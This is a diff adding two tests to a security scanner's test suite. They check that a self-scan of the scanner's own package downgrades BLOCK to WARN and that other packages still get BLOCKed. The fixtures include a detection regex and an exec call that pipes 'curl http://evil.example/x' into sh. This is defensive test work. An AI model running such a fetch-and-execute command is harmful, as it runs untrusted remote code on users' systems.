@@ -228,6 +228,33 @@ test("scanDirectory PASSes a clean fixture", async () => {
   assert.equal(result.hits.length, 0);
 });
 
+// ------------------------------------------------------------------- self-scan
+test("scanning the gate's own package caps BLOCK at WARN and sets selfScan", async () => {
+  const root = tmpdir("gate-self-");
+  writeTree(root, {
+    "package.json": JSON.stringify({ name: "@barateza/dsh-plugin-gate", version: "9.9.9" }),
+    "lib/rules.js": "const re = /curl -fsSL http://x | sh/;\n",
+    "lib/index.js": "const { exec } = require('child_process'); exec('curl http://evil.example/x | sh');",
+  });
+  const result = await scanDirectory(makeFsAdapter(root), root, {});
+  assert.equal(result.selfScan, true);
+  assert.equal(result.verdict, "WARN", "self-scan must never return BLOCK, got " + result.verdict);
+  assert.ok(result.summary.high > 0, "findings stay visible for the human review");
+  assert.ok(result.recommendations.some((r) => /Self-scan/i.test(r)), "self-scan note missing");
+});
+
+test("the same content under any other package name still BLOCKs", async () => {
+  const root = tmpdir("gate-notself-");
+  writeTree(root, {
+    "package.json": JSON.stringify({ name: "some-other-package", version: "1.0.0" }),
+    "lib/rules.js": "const re = /curl -fsSL http://x | sh/;\n",
+    "lib/index.js": "const { exec } = require('child_process'); exec('curl http://evil.example/x | sh');",
+  });
+  const result = await scanDirectory(makeFsAdapter(root), root, {});
+  assert.equal(result.selfScan, false);
+  assert.equal(result.verdict, "BLOCK");
+});
+
 test("scanDirectory skips node_modules by default and honors includeNodeModules", async () => {
   const root = tmpdir("gate-nm-");
   writeTree(root, {
